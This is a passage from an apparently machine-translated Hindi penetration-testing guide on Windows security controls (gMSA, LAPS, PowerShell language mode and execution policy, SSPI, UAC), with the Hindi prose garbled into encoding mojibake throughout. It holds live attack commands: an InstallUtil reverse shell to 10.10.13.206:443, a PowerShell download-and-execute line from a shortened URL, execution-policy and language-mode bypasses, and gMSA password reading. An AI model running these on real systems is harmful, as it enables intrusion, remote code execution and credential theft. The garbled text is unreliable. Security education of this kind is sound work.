рдЗрд╕ рддрд░реАрдХреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рдХрд┐ **рдкреАрдбрд╝рд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рд╣реЛрд╕реНрдЯ рдХреЗ рдЕрдВрджрд░ рдПрдХ **рдкреНрд░рдХреНрд░рд┐рдпрд╛** **рдЪрд▓рд╛** рд░рд╣рд╛ рд╣реЛред рдЕрдЧрд░ рдРрд╕рд╛ рд╣реИ, рддреЛ `meterpreter` рд╕рддреНрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдЯреЛрдХрди рдХреА рдирдХрд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (`impersonate_token` `incognito` рд╕реЗ)ред рдпрд╛ рдЖрдк рд╕рд┐рд░реНрдл рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ `migrate` рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

#### рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдкрд╛рд╕рд╡рд░реНрдб рдЬрд╛рдирдирд╛

{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}

## Group Managed Service Accounts (gMSA)

рдЕрдзрд┐рдХрд╛рдВрд╢ рдЗрдВрдлреНрд░рд╛рд╕реНрдЯреНрд░рдХреНрдЪрд░ рдореЗрдВ, рд╕реЗрд╡рд╛ рдЦрд╛рддреЗ рд╕рд╛рдорд╛рдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддреЗ рд╣реЛрддреЗ рд╣реИрдВ рдЬрд┐рдирдореЗрдВ тАЬ**рдкрд╛рд╕рд╡рд░реНрдб рдХрднреА рд╕рдорд╛рдкреНрдд рдирд╣реАрдВ рд╣реЛрддрд╛**тАЭ рд╡рд┐рдХрд▓реНрдк рд╣реЛрддрд╛ рд╣реИред рдЗрди рдЦрд╛рддреЛрдВ рдХрд╛ рдкреНрд░рдмрдВрдзрди рдПрдХ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╕рдорд╕реНрдпрд╛ рд╣реЛ рд╕рдХрддреА рд╣реИ рдФрд░ рдЗрд╕реАрд▓рд┐рдП Microsoft рдиреЗ **Managed Service Accounts** рдкреЗрд╢ рдХрд┐рдП:

* рдЕрдм рдкрд╛рд╕рд╡рд░реНрдб рдкреНрд░рдмрдВрдзрди рдХреА рдЬрд░реВрд░рдд рдирд╣реАрдВ рд╣реИред рдпрд╣ рдПрдХ рдЬрдЯрд┐рд▓, рдпрд╛рджреГрдЪреНрдЫрд┐рдХ, 240-рдЕрдХреНрд╖рд░ рдХрд╛ рдкрд╛рд╕рд╡рд░реНрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЬрдм рдбреЛрдореЗрди рдпрд╛ рдХрдВрдкреНрдпреВрдЯрд░ рдкрд╛рд╕рд╡рд░реНрдб рд╕рдорд╛рдкреНрддрд┐ рддрд┐рдерд┐ рддрдХ рдкрд╣реБрдВрдЪрддрд╛ рд╣реИ рддреЛ рдЙрд╕реЗ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдмрджрд▓ рджреЗрддрд╛ рд╣реИред
* рдпрд╣ Microsoft Key Distribution Service (KDC) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ gMSA рдХреЗ рд▓рд┐рдП рдкрд╛рд╕рд╡рд░реНрдб рдмрдирд╛рдиреЗ рдФрд░ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░рддрд╛ рд╣реИред
* рдЗрд╕реЗ рд▓реЙрдХ рдЖрдЙрдЯ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рдпрд╛ рдЗрдВрдЯрд░рдПрдХреНрдЯрд┐рд╡ рд▓реЙрдЧрд┐рди рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛
* рдХрдИ рд╣реЛрд╕реНрдЯреЛрдВ рдХреЗ рдмреАрдЪ рд╕рд╛рдЭрд╛ рдХрд░рдиреЗ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИ
* рд╢реЗрдбреНрдпреВрд▓ рдХрд┐рдП рдЧрдП рдХрд╛рд░реНрдпреЛрдВ рдХреЛ рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ (Managed service accounts рд╢реЗрдбреНрдпреВрд▓ рдХрд┐рдП рдЧрдП рдХрд╛рд░реНрдпреЛрдВ рдХреЛ рдЪрд▓рд╛рдиреЗ рдХрд╛ рд╕рдорд░реНрдерди рдирд╣реАрдВ рдХрд░рддреЗ)
* рд╕рд░рд▓реАрдХреГрдд SPN рдкреНрд░рдмрдВрдзрди тАУ рд╕рд┐рд╕реНрдЯрдо рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ SPN рдорд╛рди рдХреЛ рдмрджрд▓ рджреЗрдЧрд╛ рдЕрдЧрд░ рдХрдВрдкреНрдпреВрдЯрд░ рдХреЗ **sAMaccount** рд╡рд┐рд╡рд░рдг рдпрд╛ DNS рдирд╛рдо рд╕рдВрдкрддреНрддрд┐ рдмрджрд▓ рдЬрд╛рддреА рд╣реИред

gMSA рдЦрд╛рддреЛрдВ рдХреЗ рдкрд╛рд╕рд╡рд░реНрдб _**msDS-ManagedPassword**_ рдирд╛рдордХ LDAP рдкреНрд░реЙрдкрд░реНрдЯреА рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддреЗ рд╣реИрдВ рдЬреЛ DCтАЩs рджреНрд╡рд╛рд░рд╛ рд╣рд░ 30 рджрд┐рдиреЛрдВ рдореЗрдВ **рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рд░реАрд╕реЗрдЯ** рд╣реЛ рдЬрд╛рддреЗ рд╣реИрдВ, **рдЕрдзрд┐рдХреГрдд рдкреНрд░рд╢рд╛рд╕рдХреЛрдВ** рдФрд░ рдЙрди рд╕рд░реНрд╡рд░реЛрдВ рджреНрд╡рд╛рд░рд╛ **рдкреНрд░рд╛рдкреНрдд рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ** рдЬрд┐рди рдкрд░ рд╡реЗ рд╕реНрдерд╛рдкрд┐рдд рд╣реИрдВред _**msDS-ManagedPassword**_ рдПрдХ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рдбреЗрдЯрд╛ рдмреНрд▓реЙрдм рд╣реИ рдЬрд┐рд╕реЗ [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдпрд╣ рдХреЗрд╡рд▓ рддрднреА рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬрдм рдХрдиреЗрдХреНрд╢рди рд╕реБрд░рдХреНрд╖рд┐рдд рд╣реЛ, **LDAPS** рдпрд╛ рдЬрдм рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░рдХрд╛рд░ 'Sealing & Secure' рд╣реЛ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдПред

![Image from https://cube0x0.github.io/Relaying-for-gMSA/](../.gitbook/assets/asd1.png)

рддреЛ, рдЕрдЧрд░ gMSA рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ, рддреЛ рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЗрд╕рдореЗрдВ **рд╡рд┐рд╢реЗрд╖ рдЕрдзрд┐рдХрд╛рд░** рд╣реИрдВ рдФрд░ рдпрд╣ рднреА рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЖрдкрдХреЗ рдкрд╛рд╕ рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рдкрд╛рд╕рд╡рд░реНрдб рдХреЛ **рдкрдврд╝рдиреЗ** рдХреА **рдЕрдиреБрдорддрд┐** рд╣реИред

рдЖрдк рдЗрд╕ рдкрд╛рд╕рд╡рд░реНрдб рдХреЛ [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader) рдХреЗ рд╕рд╛рде рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВ:
```
/GMSAPasswordReader --AccountName jkohler
```
рдЗрд╕ [рд╡реЗрдм рдкреЗрдЬ](https://cube0x0.github.io/Relaying-for-gMSA/) рдХреЛ рднреА рджреЗрдЦреЗрдВ рдЬреЛ рдмрддрд╛рддрд╛ рд╣реИ рдХрд┐ рдХреИрд╕реЗ **NTLM relay attack** рдХрд╛ рдкреНрд░рдпреЛрдЧ рдХрд░рдХреЗ **gMSA** рдХрд╛ **рдкрд╛рд╕рд╡рд░реНрдб** **рдкрдврд╝рд╛** рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

## LAPS

[**Local Administrator Password Solution (LAPS)**](https://www.microsoft.com/en-us/download/details.aspx?id=46899) рдЖрдкрдХреЛ рдбреЛрдореЗрди-рдЬреБрдбрд╝реЗ рдХрдВрдкреНрдпреВрдЯрд░реЛрдВ рдкрд░ рд╕реНрдерд╛рдиреАрдп рдПрдбрдорд┐рдирд┐рд╕реНрдЯреНрд░реЗрдЯрд░ рдХрд╛ рдкрд╛рд╕рд╡рд░реНрдб (**рдпрд╛рджреГрдЪреНрдЫрд┐рдХ**, рдЕрджреНрд╡рд┐рддреАрдп рдФрд░ рдирд┐рдпрдорд┐рдд рд░реВрдк рд╕реЗ **рдмрджрд▓рд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛**) **рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдпреЗ рдкрд╛рд╕рд╡рд░реНрдб рдХреЗрдВрджреНрд░реАрдп рд░реВрдк рд╕реЗ Active Directory рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ рдФрд░ ACLs рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдзрд┐рдХреГрдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рддрдХ рд╕реАрдорд┐рдд рд╣реЛрддреЗ рд╣реИрдВред рдпрджрд┐ рдЖрдкрдХреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдкрд░реНрдпрд╛рдкреНрдд рдЕрдиреБрдорддрд┐рдпрд╛рдВ рджреА рдЧрдИ рд╣реИрдВ рддреЛ рдЖрдк рд╕реНрдерд╛рдиреАрдп рдПрдбрдорд┐рдиреНрд╕ рдХреЗ рдкрд╛рд╕рд╡рд░реНрдб рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВред

{% content-ref url="active-directory-methodology/laps.md" %}
[laps.md](active-directory-methodology/laps.md)
{% endcontent-ref %}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) рдХрдИ рдРрд╕реА рд╕реБрд╡рд┐рдзрд╛рдУрдВ рдХреЛ **рд╕реАрдорд┐рдд рдХрд░ рджреЗрддрд╛ рд╣реИ** рдЬреЛ PowerShell рдХрд╛ рдкреНрд░рднрд╛рд╡реА рдврдВрдЧ рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╣реИрдВ, рдЬреИрд╕реЗ рдХрд┐ COM рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреЛ рдмреНрд▓реЙрдХ рдХрд░рдирд╛, рдХреЗрд╡рд▓ рдЕрдиреБрдореЛрджрд┐рдд .NET рдкреНрд░рдХрд╛рд░реЛрдВ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдирд╛, XAML-рдЖрдзрд╛рд░рд┐рдд рд╡рд░реНрдХрдлреНрд▓реЛрдЬрд╝, PowerShell рдХреНрд▓рд╛рд╕реЗрд╕, рдФрд░ рдЕрдзрд┐рдХред

### **рдЬрд╛рдВрдЪреЗрдВ**
```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### рдмрд╛рдпрдкрд╛рд╕
```powershell
#Easy bypass
Powershell -version 2
```
рд╡рд░реНрддрдорд╛рди Windows рдореЗрдВ рд╡рд╣ Bypass рдХрд╛рдо рдирд╣реАрдВ рдХрд░реЗрдЧрд╛ рд▓реЗрдХрд┐рди рдЖрдк [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
**рдЗрд╕реЗ рдХрдВрдкрд╛рдЗрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рдЬрд░реВрд░рдд рдкрдбрд╝ рд╕рдХрддреА рд╣реИ** _**рд╕рдВрджрд░реНрдн рдЬреЛрдбрд╝реЗрдВ**_ -> _рдмреНрд░рд╛рдЙрдЬрд╝ рдХрд░реЗрдВ_ -> _рдмреНрд░рд╛рдЙрдЬрд╝ рдХрд░реЗрдВ_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` рдЬреЛрдбрд╝реЗрдВ рдФрд░ **рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдХреЛ .Net4.5 рдореЗрдВ рдмрджрд▓реЗрдВ**ред

#### рд╕реАрдзрд╛ рдмрд╛рдпрдкрд╛рд╕:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### рд░рд┐рд╡рд░реНрд╕ рд╢реЗрд▓:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
рдЖрдк [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) рдпрд╛ [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд┐рд╕реА рднреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ **Powershell** рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╕рдВрдпрдорд┐рдд рдореЛрдб рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рджреЗрдЦреЗрдВ: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## PS рдирд┐рд╖реНрдкрд╛рджрди рдиреАрддрд┐

рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдпрд╣ **рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд** рдкрд░ рд╕реЗрдЯ рд╣реЛрддреА рд╣реИред рдЗрд╕ рдиреАрддрд┐ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рдореБрдЦреНрдп рддрд░реАрдХреЗ:
```powershell
1┬║ Just copy and paste inside the interactive PS console
2┬║ Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3┬║ Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4┬║ Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5┬║ Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6┬║ Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7┬║ Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8┬║ Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9┬║ Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
рдФрд░ рдЬрд╛рдирдХрд╛рд░реА [рдпрд╣рд╛рдБ](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/) рдкрд╛рдИ рдЬрд╛ рд╕рдХрддреА рд╣реИред

## рд╕рд┐рдХреНрдпреЛрд░рд┐рдЯреА рд╕рдкреЛрд░реНрдЯ рдкреНрд░реЛрд╡рд╛рдЗрдбрд░ рдЗрдВрдЯрд░рдлреЗрд╕ (SSPI)

рдпрд╣ рдПрдХ API рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдкреНрд░рдорд╛рдгрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

SSPI рджреЛ рдорд╢реАрдиреЛрдВ рдХреЗ рдмреАрдЪ рд╕рдВрд╡рд╛рдж рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреБрдХреНрдд рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдЦреЛрдЬрдиреЗ рдХрд╛ рдХрд╛рдо рдХрд░реЗрдЧрд╛ред рдЗрд╕рдХреЗ рд▓рд┐рдП рдкрд╕рдВрджреАрджрд╛ рд╡рд┐рдзрд┐ Kerberos рд╣реИред рдлрд┐рд░ SSPI рдпрд╣ рддрдп рдХрд░реЗрдЧрд╛ рдХрд┐ рдХреМрди рд╕рд╛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдЗрди рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░реЛрдЯреЛрдХреЙрд▓реЛрдВ рдХреЛ рд╕рд┐рдХреНрдпреЛрд░рд┐рдЯреА рд╕рдкреЛрд░реНрдЯ рдкреНрд░реЛрд╡рд╛рдЗрдбрд░ (SSP) рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ, рдпреЗ рдкреНрд░рддреНрдпреЗрдХ Windows рдорд╢реАрди рдХреЗ рдЕрдВрджрд░ DLL рдХреЗ рд░реВрдк рдореЗрдВ рд╕реНрдерд┐рдд рд╣реЛрддреЗ рд╣реИрдВ рдФрд░ рджреЛрдиреЛрдВ рдорд╢реАрдиреЛрдВ рдХреЛ рд╕рдВрд╡рд╛рдж рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╣реА SSP рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред

### рдореБрдЦреНрдп SSPs

* **Kerberos**: рдкрд╕рдВрджреАрджрд╛ рд╡рд┐рдзрд┐
* %windir%\Windows\System32\kerberos.dll
* **NTLMv1** рдФрд░ **NTLMv2**: рд╕рдВрдЧрддрддрд╛ рдХреЗ рд▓рд┐рдП
* %windir%\Windows\System32\msv1\_0.dll
* **Digest**: рд╡реЗрдм рд╕рд░реНрд╡рд░ рдФрд░ LDAP, рдкрд╛рд╕рд╡рд░реНрдб MD5 рд╣реИрд╢ рдХреЗ рд░реВрдк рдореЗрдВ
* %windir%\Windows\System32\Wdigest.dll
* **Schannel**: SSL рдФрд░ TLS
* %windir%\Windows\System32\Schannel.dll
* **Negotiate**: рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ (Kerberos рдпрд╛ NTLM, Kerberos рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╣реЛрдиреЗ рдХреЗ рдирд╛рддреЗ) рдХреЛ рддрдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ
* %windir%\Windows\System32\lsasrv.dll

#### рдмрд╛рддрдЪреАрдд рдореЗрдВ рдХрдИ рд╡рд┐рдзрд┐рдпрд╛рдБ рдпрд╛ рдХреЗрд╡рд▓ рдПрдХ рд╣реА рдкреЗрд╢ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИред

## UAC - рдпреВрдЬрд░ рдЕрдХрд╛рдЙрдВрдЯ рдХрдВрдЯреНрд░реЛрд▓

[рдпреВрдЬрд░ рдЕрдХрд╛рдЙрдВрдЯ рдХрдВрдЯреНрд░реЛрд▓ (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) рдПрдХ рдРрд╕реА рд╕реБрд╡рд┐рдзрд╛ рд╣реИ рдЬреЛ **рдЙрдЪреНрдЪ рд╕реНрддрд░реАрдп рдЧрддрд┐рд╡рд┐рдзрд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП рд╕рд╣рдорддрд┐ рдкреНрд░реЙрдореНрдкреНрдЯ** рд╕рдХреНрд╖рдо рдХрд░рддреА рд╣реИред

{% content-ref url="windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрд╕рд╛рдиреА рд╕реЗ **рд╡рд░реНрдХрдлреНрд▓реЛрдЬрд╝ рдХрд╛ рдирд┐рд░реНрдорд╛рдг рдФрд░ рдСрдЯреЛрдореЗрд╢рди** рдХрд░реЗрдВ, рдЬреЛ рджреБрдирд┐рдпрд╛ рдХреЗ **рд╕рдмрд╕реЗ рдЙрдиреНрдирдд** рд╕рдореБрджрд╛рдп рдЯреВрд▓реНрд╕ рджреНрд╡рд╛рд░рд╛ рд╕рдВрдЪрд╛рд▓рд┐рдд рд╣реЛрддреЗ рд╣реИрдВред\
рдЖрдЬ рд╣реА рдкрд╣реБрдБрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) рдХреЗ рд╕рд╛рде AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ **Twitter** ЁЯРж рдкрд░ рдореБрдЭреЗ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>
